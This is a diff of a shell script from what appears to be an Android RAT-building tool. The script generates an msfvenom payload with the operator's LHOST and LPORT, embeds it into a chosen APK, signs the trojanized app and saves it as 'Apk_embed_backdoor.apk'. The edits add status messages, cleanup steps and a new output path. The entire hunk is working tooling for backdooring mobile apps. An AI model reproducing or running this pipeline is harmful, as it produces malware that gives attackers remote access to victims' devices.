@@ -973,13 +973,30 @@ $msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/output/paylo
 echo "Done !" 
 sleep 2
 echo "Starting the merging process of RAT with the APK you selected"
+echo ""
 ruby $apkembed $path/output/fatrat.apk 
 echo ""
+echo "Merge completed of Payload with your APK"
+sleep 2
 cp $path/output/fatrat_backdoored.apk $path/backdoored/apkembed.apk
-#rm -rf $path/output/* 
-java -jar $bundle $cert $key $path/backdoored/apkembed.apk $path/output/Apk_embed_backdoor.apk
+echo "File copied with success to : $path/backdoored"
+sleep 2
+echo "Removing temporary files from output"
+sleep 2
+rm -rf $path/output/* 
+echo "Signing your APK file"
+sleep 2
+java -jar $bundle $cert $key $path/backdoored/apkembed.apk Apk_embed_backdoor.apk
 rm $path/backdoored/apkembed.apk
-echo -ne $okegreen" Your payload has been successfully embed with sign and is located here ( output folder )  "
+mv $path/Apk_embed_backdoor.apk $path/backdoored/output/
+outapk="$path/backdoored/output/Apk_embed_backdoor.apk"
+if [ ! -f $outapk ]; then
+    echo "[!] APK Rat file was not found in : $path/backdoored/output/"
+    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
+menu
+  fi 
+echo -ne $okegreen" Your payload has been successfully embed with sign and is located here :
+ $path/backdoored/output/Apk_embed_backdoor.apk"
 read loveyou
 echo
 clear
